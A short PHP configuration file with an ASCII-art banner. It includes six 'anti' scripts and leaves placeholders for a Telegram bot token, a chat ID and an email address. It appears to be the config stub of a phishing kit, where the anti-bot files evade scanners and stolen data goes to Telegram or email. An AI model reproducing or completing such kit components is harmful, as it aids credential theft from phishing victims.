<?php
/*
  ██████  ▄████▄   ██▓███     ▄▄▄█████▓▓█████ ▄▄▄       ███▄ ▄███▓
▒██    ▒ ▒██▀ ▀█  ▓██░  ██▒   ▓  ██▒ ▓▒▓█   ▀▒████▄    ▓██▒▀█▀ ██▒
░ ▓██▄   ▒▓█    ▄ ▓██░ ██▓▒   ▒ ▓██░ ▒░▒███  ▒██  ▀█▄  ▓██    ▓██░
  ▒   ██▒▒▓▓▄ ▄██▒▒██▄█▓▒ ▒   ░ ▓██▓ ░ ▒▓█  ▄░██▄▄▄▄██ ▒██    ▒██ 
▒██████▒▒▒ ▓███▀ ░▒██▒ ░  ░     ▒██▒ ░ ░▒████▒▓█   ▓██▒▒██▒   ░██▒
▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░▒▓▒░ ░  ░     ▒ ░░   ░░ ▒░ ░▒▒   ▓▒█░░ ▒░   ░  ░
░ ░▒  ░ ░  ░  ▒   ░▒ ░            ░     ░ ░  ░ ▒   ▒▒ ░░  ░      ░
░  ░  ░  ░        ░░            ░         ░    ░   ▒   ░      ░   
      ░  ░ ░                              ░  ░     ░  ░       ░   
         ░                                                        
*/
include "anti/anti1.php";
include "anti/anti2.php"; 
include "anti/anti3.php"; 
include "anti/anti4.php"; 
include "anti/anti5.php"; 
include "anti/anti7.php"; 
$api = "your api bot token";
$chatid = "your chat id";
$email ="your email";
?>
